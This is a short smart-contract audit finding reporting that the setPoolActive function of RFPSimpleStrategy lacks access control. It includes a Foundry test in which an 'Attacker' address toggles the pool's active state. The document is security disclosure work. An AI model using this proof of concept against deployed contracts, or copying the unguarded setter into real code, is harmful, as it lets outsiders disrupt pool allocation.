# Anyone can make the pool active or Inactive
RFPSimpleStrategy can me make active Or Inactive by the pool manager as per the invariant. The strategy has a function named `setPoolActive` for this.

## Vulnerability Detail


This function does not have any access control check such that it only allows Manager to call it. 

Paste this file in RFPSimpleStrategy.t.sol
Run `forge test --mt test_anyone_can_active_or_inactive`
```solidity
 function test_anyone_can_active_or_inactive() public {
         RFPSimpleStrategy testStrategy = new RFPSimpleStrategy(address(allo()), "RFPSimpleStrategy");
         vm.startPrank(makeAddr("Attacker"));
         testStrategy.setPoolActive(true);
         testStrategy.setPoolActive(false);

    }
```

## Impact
Attacker can set the strategy to be true from the beginning, thereby preventing it to work effectively.Allocate can be called any number of times.
